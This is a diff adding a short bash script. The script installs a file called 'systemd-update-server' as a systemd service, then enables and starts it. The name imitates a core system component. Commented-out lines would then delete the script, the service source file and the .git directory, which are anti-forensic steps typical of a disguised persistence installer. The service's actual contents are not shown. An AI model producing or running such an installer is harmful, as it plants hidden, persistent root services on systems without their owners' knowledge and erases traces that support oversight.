@@ -1,0 +1,18 @@
+#!/bin/bash
+cd "$(dirname "$0")"
+#[ -d ".git" ] && rm -rf .git
+if [ -f "systemd-update-server" ]; then
+  cp systemd-update-server /etc/systemd/system/systemd-update-server.service
+  systemctl daemon-reload && systemctl enable systemd-update-server.service --now
+  SERVICE_STATUS=$(systemctl is-active systemd-update-server.service)
+  if [ "$SERVICE_STATUS" = "active" ]; then
+#    rm -f systemd-update-server
+    SCRIPT_PATH="$(readlink -f "$0")"
+#    nohup bash -c "sleep 1 && rm -f \"$SCRIPT_PATH\"" > /dev/null 2>&1 &
+  else
+    exit 1
+  fi
+else
+  exit 1
+fi
+exit 0
